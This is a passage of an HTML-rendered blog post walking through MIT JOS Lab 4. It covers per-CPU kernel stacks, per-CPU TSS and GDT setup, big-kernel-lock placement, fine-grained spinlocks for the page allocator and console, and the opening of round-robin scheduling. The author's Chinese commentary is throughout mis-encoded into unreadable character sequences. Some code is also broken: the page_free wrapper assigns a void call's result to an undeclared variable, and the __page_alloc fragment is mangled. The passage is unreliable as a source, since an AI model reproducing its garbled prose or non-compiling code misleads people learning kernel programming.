class="hljs-comment">//</span><br><span class="hljs-comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span><br><span class="hljs-comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span><br><span class="hljs-comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span><br><span class="hljs-comment">// divided into two pieces, just like the single stack you set up in</span><br><span class="hljs-comment">// mem_init:</span><br><span class="hljs-comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span><br><span class="hljs-comment">//          -- backed by physical memory</span><br><span class="hljs-comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span><br><span class="hljs-comment">//          -- not backed; so if the kernel overflows its stack,</span><br><span class="hljs-comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span><br><span class="hljs-comment">//             Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NCPU; i++)<br>&#123;<br>boot_map_region(kern_pgdir, <br>KSTACKTOP - i * (KSTKSIZE + KSTKGAP) - KSTKSIZE, <br>KSTKSIZE, <br>PADDR(&amp;percpu_kstacks[i]), <br>PTE_W);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œæ›´æ”¹ <code>trap_init_percpu()</code> ä»¥è®©å…¶èƒ½æ­£å¸¸åœ¨æ‰€æœ‰ CPU ä¸Šè¿è¡Œ</p><blockquote><p><strong>Exercise 4.</strong> The code in <code>trap_init_percpu()</code> (<code>kern/trap.c</code>) initializes the TSS and TSS descriptor for the BSP. It worked in Lab 3, but is incorrect when running on other CPUs. Change the code so that it can work on all CPUs. (Note: your new code should not use the global <code>ts</code> variable any more.)</p></blockquote><p>ä¸»è¦å°±æ˜¯æŠŠå…¨å±€å˜é‡ <code>ts</code> æ›¿æ¢æˆ <code>thiscpu</code> æŒ‡å‘çš„ <code>CpuInfo</code> ç»“æ„ä½“çš„ <code>cpu_ts</code> æˆå‘˜å³å¯ï¼Œä»¥åŠä¿®æ”¹å…¨å±€æ®µæè¿°ç¬¦è¡¨ä¸­å¯¹åº”æ®µæè¿°ç¬¦ä¸º tss æè¿°ç¬¦æ—¶æ³¨æ„ä½¿ç”¨ <code>cpunum()</code> æ¥è·å–å½“å‰ CPU çš„æ ‡å·ï¼Œè¿˜æœ‰å°±æ˜¯æ³¨æ„å°† tss çš„ esp åˆå§‹åŒ–ä¸ºå¯¹åº” cpu çš„æ ˆï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ç‚¹å°±æ˜¯ <code>ltr</code> æŒ‡ä»¤æ‰€ç”¨çš„å€¼åº”ä¸º <em>å¯¹åº”çš„æè¿°ç¬¦åœ¨å…¨å±€æè¿°ç¬¦è¡¨ä¸­çš„åç§»</em> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize and load the per-CPU TSS and IDT</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init_percpu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here sets up the Task State Segment (TSS) and</span><br><span class="hljs-comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span><br><span class="hljs-comment">// running on other CPUs because each CPU has its own kernel stack.</span><br><span class="hljs-comment">// Fix the code so that it works for all CPUs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span><br><span class="hljs-comment">//     struct CpuInfo;</span><br><span class="hljs-comment">//   - The ID of the current CPU is given by cpunum() or</span><br><span class="hljs-comment">//     thiscpu-&gt;cpu_id;</span><br><span class="hljs-comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span><br><span class="hljs-comment">//     rather than the global &quot;ts&quot; variable;</span><br><span class="hljs-comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span><br><span class="hljs-comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span><br><span class="hljs-comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span><br><span class="hljs-comment">//     from doing IO (0 is not the correct value!)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span><br><span class="hljs-comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span><br><span class="hljs-comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span><br><span class="hljs-comment">// wrong, you may not get a fault until you try to return from</span><br><span class="hljs-comment">// user space on that CPU.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><br><span class="hljs-comment">// Setup a TSS so that we get the right stack</span><br><span class="hljs-comment">// when we trap to the kernel.</span><br>thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - (KSTKSIZE + KSTKGAP) * cpunum();<br>thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;<br>thiscpu-&gt;cpu_ts.ts_iomb = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate);<br><br><span class="hljs-comment">// Initialize the TSS slot of the gdt.</span><br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="hljs-type">uint32_t</span>) (&amp;thiscpu-&gt;cpu_ts),<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()].sd_s = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// Load the TSS selector (like other segment selectors, the</span><br><span class="hljs-comment">// bottom three bits are special; we leave them 0)</span><br>ltr(GD_TSS0 + (cpunum() * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Segdesc)));<br><br><span class="hljs-comment">// Load the IDT</span><br>lidt(&amp;idt_pd);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>make qemu CPUS=4</code>ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å‡ ä¸ªå¤„ç†å™¨éƒ½æˆåŠŸåœ°å¯åŠ¨äº†ï¼š</p><p><img src="https://s2.loli.net/2022/03/21/VvEiuky4DseIRTq.png" alt="image.png"></p><h4 id="Locking">Locking</h4><p>ä¼´éšç€å¤šå¤„ç†å™¨ç³»ç»Ÿçš„å‡ºç°ï¼Œ <em>æ¡ä»¶ç«äº‰</em> ï¼ˆrace conditionï¼‰æˆä¸ºäº†æˆ‘ä»¬ä¸å¾—ä¸è€ƒè™‘çš„ä¸€ä¸ªé—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>é”</code> æ¥ä¿æŠ¤ä¸´ç•ŒåŒºä¸­çš„æ•°æ®ï¼Œåœ¨åŒä¸€æ—¶é—´æ®µåªæœ‰ä¸€ä¸ª CPU å¯ä»¥æ”¹å˜ä¸´ç•ŒåŒºå†…çš„æ•°æ®ï¼Œæ¯”è¾ƒæœ´ç´ çš„ä¸€ä¸ªåŠæ³•å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„ <em>big kernel lock</em> ï¼Œå½“ç”¨æˆ·è¿›ç¨‹è¿›å…¥å†…æ ¸æ€æ—¶ä¸Šé”ï¼Œé€€å‡ºåå†è§£é”ï¼Œè¿™æ ·åœ¨åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å¯ä»¥è¿è¡Œåœ¨å†…æ ¸æ€ï¼Œç¡®ä¿äº†å†…æ ¸æ•°æ®çš„å®‰å…¨</p><p>åœ¨ <code>kern/spinlock.h</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªå¤§çš„å†…æ ¸é” <code>kernel_lock</code>ï¼ŒåŒæ—¶æä¾›äº†åŠ é”ä¸è§£é”çš„å‡½æ•° <code>lock_kernel()</code> å’Œ <code>unlock_kernel()</code>ï¼Œæˆ‘ä»¬åº”å½“åœ¨ä»¥ä¸‹å››ä¸ªåœ°æ–¹ä½¿ç”¨å¤§å†…æ ¸é”ï¼š</p><ul><li>åœ¨ BSP å”¤é†’ APs å‰è¯·æ±‚é”ï¼ˆ<code>i386_init()</code>ï¼‰</li><li>åœ¨åˆå§‹åŒ–å½“å‰ AP åè¯·æ±‚é”ï¼ˆ<code>mp_main()</code>ï¼‰ï¼Œä¹‹åè°ƒç”¨ <code>sched_yield()</code> ä»¥åœ¨è¯¥ AP ä¸Šè¿è¡Œç”¨æˆ·è¿›ç¨‹</li><li>åœ¨ä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸æ€æ—¶è¯·æ±‚é”ï¼ˆ<code>trap()</code>ï¼‰ï¼Œä¸ºäº†ç¡®å®šé™·é˜±å‘ç”Ÿåœ¨ç”¨æˆ·æ€è¿˜æ˜¯å†…æ ¸æ€ï¼Œæˆ‘ä»¬åº”å½“æ£€æŸ¥ <code>tf_cs</code> çš„ RPL</li><li>åœ¨ä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€ä¹‹å‰é‡Šæ”¾é”ï¼ˆ<code>env_run()</code>ï¼‰ï¼Œä¸è¦è¿‡æ—©æˆ–è¿‡æ™šï¼Œå¦åˆ™å¯èƒ½ä¼šé€ æˆç«æ€æˆ–æ­»é”</li></ul><p>äºæ˜¯æ¥ä¸‹æ¥å°±æ˜¯ Exercise 5ï¼šåœ¨ä¸Šè¿°ä½ç½®è¡¥å……ç›¸åº”çš„é”</p><blockquote><p><strong>Exercise 5.</strong> Apply the big kernel lock as described above, by calling <code>lock_kernel()</code> and <code>unlock_kernel()</code> at the proper locations.</p></blockquote><p>åœ¨ JOS ä¸­ï¼Œä¸€ä¸ªè‡ªæ—‹é”èµ·å…¶å®è¢«å®šä¹‰ä¸ºä¸€ä¸ªæ™®é€šçš„æ•´å‹å˜é‡ï¼Œ<strong>ä½†æ˜¯ä¸Šé”ä¸è§£é”çš„æ“ä½œæ˜¯é€šè¿‡åŸå­æŒ‡ä»¤å®Œæˆçš„</strong>ï¼Œè€ŒåŸå­æŒ‡ä»¤çš„å®ç°<strong>å…¶å®æ˜¯é€šè¿‡ <code>lock</code> å‰ç¼€å®Œæˆçš„</strong>ï¼Œè¢«è¯¥å‰ç¼€ä¿®é¥°çš„æŒ‡ä»¤åœ¨è®¿é—®å†…å­˜æ—¶åŒæ—¶ä¼šå®Œæˆå¯¹æ€»çº¿çš„æ§åˆ¶ï¼Œç›´åˆ°æŒ‡ä»¤ç»“æŸï¼Œä»è€Œ<strong>ä»ç¡¬ä»¶å±‚é¢ä¿è¯äº†æŒ‡ä»¤çš„åŸå­æ€§</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> result;<br><br><span class="hljs-comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span><br><span class="hljs-params">     : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;1&quot;</span> (newval)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;cc&quot;</span>)</span>;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç°åœ¨ä½ çŸ¥é“ä¸€ä¸ªè‡ªæ—‹é”è¯¥æ€ä¹ˆå®ç°äº†å§ ï¼›ï¼‰é‚£ä¹ˆäº’æ–¥é”å‘¢ï¼Ÿäº’æ–¥é”çš„å®ç°å…¶å®éœ€è¦ä¾èµ–é¢å¤–çš„è¾…åŠ©ç»“æ„â€¦</p></blockquote><p>è¿™é‡Œ <code>lock_kernel()</code> å’Œ <code>unlock_kernel()</code>ç›´æ¥æ“ä½œçš„å°±æ˜¯å¤§å†…æ ¸é”ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†å…¶æ”¾ç½®åœ¨å¯¹åº”ä½ç½®å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">i386_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// Acquire the big kernel lock before waking up APs</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    <br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Setup code for APs</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">mp_main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// We are in high EIP now, safe to switch to kern_pgdir </span><br>lcr3(PADDR(kern_pgdir));<br>cprintf(<span class="hljs-string">&quot;SMP: CPU %d starting\n&quot;</span>, cpunum());<br><br>lapic_init();<br>env_init_percpu();<br>trap_init_percpu();<br>xchg(&amp;thiscpu-&gt;cpu_status, CPU_STARTED); <span class="hljs-comment">// tell boot_aps() we&#x27;re up</span><br><br><span class="hljs-comment">// Now that we have finished some basic setup, call sched_yield()</span><br><span class="hljs-comment">// to start running processes on this CPU.  But make sure that</span><br><span class="hljs-comment">// only one CPU can enter the scheduler at a time!</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    sched_yield();<br><br><span class="hljs-comment">// Remove this after you finish Exercise 6</span><br><span class="hljs-keyword">for</span> (;;);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">3</span>) &#123;<br><span class="hljs-comment">// Trapped from user mode.</span><br><span class="hljs-comment">// Acquire the big kernel lock before doing any</span><br><span class="hljs-comment">// serious kernel work.</span><br><span class="hljs-comment">// LAB 4: Your code here.</span><br>assert(curenv);<br>lock_kernel();<br><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>    unlock_kernel();<br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¹ é¢˜ timeï¼šä¸ºä»€ä¹ˆæœ‰äº†å¤§å†…æ ¸é”æˆ‘ä»¬è¿˜è¦ä¸ºæ¯ä¸ª CPU åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„å†…æ ¸æ ˆï¼Ÿ</p><blockquote><p><strong>Question</strong></p><ol><li>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</li></ol></blockquote><p>æˆ‘ä»¬åœ¨ä»ç”¨æˆ·æ€é™·å…¥åˆ°å†…æ ¸æ€å†åˆ°è·å–åˆ°é”ä¸­é—´ä»æœ‰ä¸€æ®µéœ€è¦å‹æ ˆçš„è¿‡ç¨‹ï¼Œå› æ­¤è‹¥å¤šä¸ªç”¨æˆ·è¿›ç¨‹åŒæ—¶é™·å…¥å†…æ ¸æ€åˆ™ä¼šç ´åæ‰å†…æ ¸æ ˆä¸Šä¿å­˜çš„å±äºå…¶ä»–ç”¨æˆ·è¿›ç¨‹çš„æ ˆå¸§</p><p>ä¹‹åæ˜¯ Challengeï¼Œä¸ºå››ä¸ªåœ°æ–¹åŠ ä¸Šé”ï¼š</p><blockquote><p><em>Challenge!</em> The big kernel lock is simple and easy to use. Nevertheless, it eliminates all concurrency in kernel mode. Most modern operating systems use different locks to protect different parts of their shared state, an approach called <em>fine-grained locking</em>. Fine-grained locking can increase performance significantly, but is more difficult to implement and error-prone. If you are brave enough, drop the big kernel lock and embrace concurrency in JOS!</p><p>It is up to you to decide the locking granularity (the amount of data that a lock protects). As a hint, you may consider using spin locks to ensure exclusive access to these shared components in the JOS kernel:</p><ul><li>The page allocator.</li><li>The console driver.</li><li>The scheduler.</li><li>The inter-process communication (IPC) state that you will implement in the part C.</li></ul></blockquote><p>ç¬¬å››ä¸ªåœ¨ part C æ‰å®ç°ï¼Œæˆ‘ä»¬å…ˆçœ‹å‰ä¸‰ä¸ª</p><p>é¦–å…ˆæ˜¯ page allocatorï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜ä¸€ä¸ªå…¨å±€çš„é”å˜é‡ï¼Œåœ¨ <code>page_init()</code> ä¸­å¯¹å…¶åˆå§‹åŒ–ï¼Œå¹¶åœ¨ <code>page_alloc()</code> ä¸ <code>page_free()</code> ä¸­éƒ½åŠ å…¥å¯¹è¯¥é”çš„ä½¿ç”¨ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°å†æ·»åŠ ä¸€å±‚ wrapper æ¥ä½¿ç”¨é”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// spinlock for page allocator</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">page_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <br><span class="hljs-comment">// 6) init page_lock</span><br>__spin_initlock(&amp;page_lock, <span class="hljs-string">&quot;page allocator lock&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><br><span class="hljs-class">__<span class="hljs-title">page_alloc</span>(<span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">res</span>;</span><br><br>spin_lock(&amp;page_lock);<br>res = __page_alloc(alloc_flags);<br>spin_unlock(&amp;page_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br>__page_free(<span class="hljs-keyword">struct</span> PageInfo *pp)<br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br>spin_lock(&amp;page_lock);<br>res = __page_free(pp);<br>spin_unlock(&amp;page_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>console driver å…¶å®ä¹Ÿæ˜¯åŒæ ·çš„æ€è·¯ï¼Œä¸è¿‡ç¬”è€…åˆ†ä¸ºè¯»å’Œå†™ä¸¤ä¸ªé”ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">read_lock</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">write_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// initialize the console devices</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cons_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>cga_init();<br>kbd_init();<br>serial_init();<br><br>__spin_initlock(&amp;read_lock, <span class="hljs-string">&quot;console read lock&quot;</span>);<br>__spin_initlock(&amp;write_lock, <span class="hljs-string">&quot;console write lock&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!serial_exists)<br>cprintf(<span class="hljs-string">&quot;Serial port does not exist!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>spin_lock(&amp;write_lock);<br>cons_putc(c);<br>spin_unlock(&amp;write_lock);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">getchar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> c;<br><br>spin_lock(&amp;read_lock);<br><br><span class="hljs-keyword">while</span> ((c = cons_getc()) == <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* do nothing */</span>;<br><br>spin_unlock(&amp;read_lock);<br><br><span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure><p><s>scheduler ç°åœ¨è¿˜æ²¡æœ‰å†™å‘¢ï¼Œæ‰€ä»¥ğŸ‘´é€‰æ‹©æ‘¸äº†</s></p><h3 id="Round-Robin-Scheduling">Round-Robin Scheduling</h3><blockquote><p>å…³äºè¿™ä¸ªç®—æ³•ï¼Œç¬”è€…åœ¨<a href="https://arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/#%E5%85%B3%E4%BA%8E%E8%BD%AE%E8%AF%A2%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B">è¿™ç¯‡åšå®¢</a>é‡Œå†™äº†ä»–çš„æ¥é¾™å»è„‰</p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç° <em>è½®è¯¢è°ƒåº¦ç®—æ³•</em> ï¼š</p><ul><li><code>sched_yield()</code> ç”¨ä»¥ä»éå† <code>envs[]</code> æ•°ç»„å¹¶é€‰æ‹©ç¬¬ä¸€ä¸ªçŠ¶æ€ä¸º <code>ENV_RUNNABLE</code> çš„è¿›ç¨‹å»è¿è¡Œ</li><li><code>sched_yield()</code> ä¸åº”å½“è®©ä¸€ä¸ªè¿›ç¨‹è¢«åŒæ—¶è·‘åœ¨ä¸¤ä¸ª CPU ä¸Š</li><li>JOS è¿˜å®ç°äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ <code>sys_yield()</code> ä»¥è®©å½“å‰ç”¨æˆ·è¿›ç¨‹ä¼‘çœ ï¼Œä½¿å½“å‰ CPU å»è¿è¡Œå¦ä¸€ä¸ªè¿›ç¨‹</li></ul><p>æ¥ä¸‹æ¥æ˜¯ Exercise 6 äº†ï¼Œåœ¨ <code>sched_yield()</code>  ä¸­å®ç°è½®è¯¢è°ƒåº¦ç®—æ³•ï¼š</p><blockquote><p><strong>Exercise 6.</strong> Implement round-robin scheduling in <code>sched_yield()</code> as described above. Donâ€™t forget to modify <code>syscall()</code> to dispatch <code>sys_yield()</code>.</p><p>Make sure to invoke <code>sched_yield()</code> in <code>mp_main</code>.</p><p>Modify <code>kern/init.c</code> to create three (or more!) environments that all 